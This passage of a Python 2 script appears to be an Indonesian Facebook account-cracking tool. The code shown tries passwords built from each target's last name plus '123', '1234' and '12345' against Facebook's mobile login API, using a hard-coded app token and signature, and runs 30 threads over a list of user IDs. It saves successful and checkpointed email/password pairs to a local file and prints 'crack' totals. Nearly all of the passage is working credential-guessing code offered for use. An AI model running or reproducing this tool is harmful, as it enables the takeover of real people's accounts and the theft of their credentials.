                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/follow.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        cek = open('done/follow.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            oke = open('done/follow.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/follow.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/follow.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/follow.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    oke = open('done/follow.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    cek = open('done/follow.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone follow.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 d4rk.py')


def user_id():
    os.system('clear')
    print logo
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Username : ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
    menu()


def saya():
    os.system('clear')
    print logo
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke youtube gw')
    os.system('xdg-open https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q')
    menu()


def perbarui():
    os.system('clear')
    print logo
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mMemperbarui Script ...\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
    menu()


if __name__ == '__main__':
    menu()
    masuk()